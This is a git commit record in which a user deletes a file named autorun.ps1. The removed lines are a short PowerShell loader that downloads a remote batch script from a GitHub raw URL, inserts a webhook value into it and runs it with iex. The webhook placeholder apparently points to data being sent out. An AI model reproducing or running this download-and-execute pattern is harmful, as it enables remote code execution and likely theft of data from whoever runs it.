92811f041ab4c0f99e3b77e76cf0826b0f9366a1
daay23 <comengday23@gmail.com>
2025-08-07 22:42:37 -0700

    Delete autorun.ps1

--- autorun.ps1
+++
@@ -1,7 +0,0 @@
-$powershell_url = "https://raw.githubusercontent.com/daay23/ooo/main/Batch.bat"
-
-#replace YOUR_WEBHOOK_HERE with $webhook
-$content = (iwr -Uri $powershell_url -UseBasicParsing) -replace "YOUR_WEBHOOK_HERE", "$webhook"
-
-iex $content
-
